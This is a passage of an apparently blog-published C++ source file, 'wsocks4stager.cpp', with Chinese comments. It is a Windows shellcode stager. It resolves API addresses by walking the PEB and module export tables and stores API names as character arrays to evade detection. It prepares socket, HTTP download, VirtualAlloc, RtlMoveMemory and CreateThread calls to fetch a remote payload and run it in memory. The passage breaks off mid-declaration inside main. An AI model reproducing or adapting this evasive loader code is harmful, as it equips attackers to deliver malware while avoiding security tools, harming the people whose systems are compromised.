class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// wsocks4stager.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ws2tcpip.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-comment">// 将宽字符串转换为多字节字符串</span><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">WideToMultiByte</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* wideStr)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!wideStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">WideCharToMultiByte</span>(CP_UTF8, <span class="hljs-number">0</span>, wideStr, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-type">char</span>* multiByteStr = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(len);<br>    <span class="hljs-keyword">if</span> (!multiByteStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">WideCharToMultiByte</span>(CP_UTF8, <span class="hljs-number">0</span>, wideStr, <span class="hljs-number">-1</span>, multiByteStr, len, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> multiByteStr;<br>&#125;<br><br><span class="hljs-comment">// 构建HTTP GET请求</span><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">BuildHttpRequest</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* host, <span class="hljs-type">int</span> port, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* path)</span> </span>&#123;<br>    <span class="hljs-type">char</span>* request = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1024</span>);<br>    <span class="hljs-keyword">if</span> (!request) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">sprintf_s</span>(request, <span class="hljs-number">1024</span>,<br>        <span class="hljs-string">&quot;GET %s HTTP/1.1\r\n&quot;</span><br>        <span class="hljs-string">&quot;Host: %s:%d\r\n&quot;</span><br>        <span class="hljs-string">&quot;User-Agent: MyDownloader/1.0\r\n&quot;</span><br>        <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>        <span class="hljs-string">&quot;\r\n&quot;</span>,<br>        path, host, port);<br><br>    <span class="hljs-keyword">return</span> request;<br>&#125;<br><br><span class="hljs-comment">// 解析HTTP响应，提取Content-Length</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">ParseContentLength</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* response)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* contentLengthHeader = <span class="hljs-string">&quot;Content-Length: &quot;</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* pos = <span class="hljs-built_in">strstr</span>(response, contentLengthHeader);<br><br>    <span class="hljs-keyword">if</span> (pos) &#123;<br>        pos += <span class="hljs-built_in">strlen</span>(contentLengthHeader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">atoi</span>(pos);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// 查找HTTP响应体开始位置</span><br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">FindResponseBody</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* response)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* bodyStart = <span class="hljs-built_in">strstr</span>(response, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bodyStart) &#123;<br>        <span class="hljs-keyword">return</span> bodyStart + <span class="hljs-number">4</span>; <span class="hljs-comment">// 跳过 &quot;\r\n\r\n&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// 自定义宽字符转小写（简化版 Unicode 支持）</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span> <span class="hljs-title">my_towlower</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> c)</span> </span>&#123;<br>    <span class="hljs-comment">// 基础拉丁字母（A-Z）直接转换</span><br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> c + <span class="hljs-number">32</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-comment">// 不区分大小写的宽字符串比较函数（不修改原始字符串）</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringW</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str2)</span> </span>&#123;<br>    <span class="hljs-comment">// 空指针检查</span><br>    <span class="hljs-keyword">if</span> (str1 == <span class="hljs-literal">NULL</span> || str2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 动态转换并比较字符，无需修改原始字符串</span><br>    <span class="hljs-keyword">while</span> (str1[i] != <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] != <span class="hljs-string">L&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-type">wchar_t</span> c1 = <span class="hljs-built_in">my_towlower</span>(str1[i]);<br>        <span class="hljs-type">wchar_t</span> c2 = <span class="hljs-built_in">my_towlower</span>(str2[i]);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">L&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ASCII字符串比较函数</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringA</span><span class="hljs-params">(CHAR str1[], CHAR str2[])</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (str1[i] &amp;&amp; str2[i]) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] != str2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 提取 DLL 名称的函数</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span> </span>&#123;<br>    <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">wchar_t</span>* temp = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br><br>    <span class="hljs-comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span><br>    <span class="hljs-keyword">while</span> (*temp) &#123;<br>        <span class="hljs-keyword">if</span> (*temp == <span class="hljs-string">L&#x27;\\&#x27;</span>) &#123;<br>            fileName = temp + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新文件名的位置</span><br>        &#125;<br>        temp++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span><br>    <span class="hljs-keyword">if</span> (!fileName) &#123;<br>        fileName = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">GetApiAddressByName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* TargertDllName, <span class="hljs-type">char</span>* ApiName)</span> </span>&#123;<br>    <span class="hljs-comment">// 从获取 PEB 地址</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-comment">// 获取 PEB.Ldr</span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br><br>    <span class="hljs-comment">// 遍历模块列表</span><br>    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;<br>    <span class="hljs-keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br><br>        <span class="hljs-keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer) &#123;<br>            <span class="hljs-type">wchar_t</span>* fullDllPath = pEntry-&gt;FullDllName.Buffer;<br><br>            <span class="hljs-comment">// 提取 DLL 名称</span><br>            <span class="hljs-type">wchar_t</span>* CurrentDllName = <span class="hljs-built_in">ExtractDllName</span>(fullDllPath);<br><br>            <span class="hljs-comment">// 比较 DLL 名称（不区分大小写）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringW</span>(CurrentDllName, TargertDllName)) &#123;<br>                <span class="hljs-comment">// 找到目标 DLL</span><br>                HMODULE hModule = (HMODULE)pEntry-&gt;DllBase;<br><br>                <span class="hljs-comment">// 分析 PE 文件找到导出表</span><br>                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + ((PIMAGE_DOS_HEADER)hModule)-&gt;e_lfanew);<br>                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +<br>                    pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br>                <span class="hljs-comment">// 获取导出表的各个信息</span><br>                DWORD* pFunctionNames = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNames);<br>                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfFunctions);<br>                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNameOrdinals);<br><br>                <span class="hljs-comment">// 遍历导出表，查找目标函数</span><br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;<br>                    <span class="hljs-type">char</span>* functionName = (<span class="hljs-type">char</span>*)((BYTE*)hModule + pFunctionNames[i]);<br><br>                    <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringA</span>(functionName, ApiName)) &#123;<br>                        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + pFunctionAddresses[pFunctionOrdinals[i]]);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果遍历完导出表未找到函数，返回 NULL</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br><br>        pCurrentEntry = pCurrentEntry-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到模块</span><br>&#125;<br><br>__declspec(<span class="hljs-built_in">code_seg</span>(<span class="hljs-string">&quot;.text$A&quot;</span>)) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 1. 函数声明</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* MyGetProcAddress)</span><span class="hljs-params">(HMODULE hModule, LPCSTR  lpProcName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* MyLoadLibraryA)</span><span class="hljs-params">(LPCSTR lpLibFileName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MyWSAStartup)</span><span class="hljs-params">(WORD wVersionRequested, LPWSADATA lpWSAData)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">SOCKET</span><span class="hljs-params">(WINAPI* MySocket)</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MyConnect)</span><span class="hljs-params">(SOCKET s, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr* name, <span class="hljs-type">int</span> namelen)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MySend)</span><span class="hljs-params">(SOCKET s, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> flags)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MyRecv)</span><span class="hljs-params">(SOCKET s, <span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> flags)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MyClosesocket)</span><span class="hljs-params">(SOCKET s)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* MyWSACleanup)</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">hostent</span>* (WINAPI* MyGethostbyname)(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name);<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span><span class="hljs-params">(WINAPI* MyVirtualAlloc)</span><span class="hljs-params">(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI* MySleep)</span><span class="hljs-params">(DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span><span class="hljs-params">(WINAPI* MyRtlMoveMemory)</span><span class="hljs-params">(PVOID Destination, PVOID Source, SIZE_T Length)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HANDLE</span><span class="hljs-params">(WINAPI* MyCreateThread)</span><span class="hljs-params">(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* MyWaitForSingleObject)</span><span class="hljs-params">(HANDLE hHandle, DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyCloseHandle)</span><span class="hljs-params">(HANDLE hObject)</span></span>;<br><br>    <span class="hljs-comment">// 2. 需要用到的API和DLL的名称</span><br>    CHAR wsaStartup[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR socket[] = &#123; <span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR connect[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR send[] = &#123; <span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR recv[] = &#123; <span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR closesocket[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR wsaCleanup[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR gethostbyname[] = &#123; <span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR virtualAlloc[] = &#123; <span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR sleep[] = &#123; <span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR rtlMoveMemory[] = &#123; <span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR createThread[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR waitForSingleObject[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR closeHandle[] = &#123; <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    CHAR loadLibraryA[] = &#123; <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR getProcAddress[] = &#123; <span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;P&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    WCHAR kernel32[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR ws2_32[] = &#123; <span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span 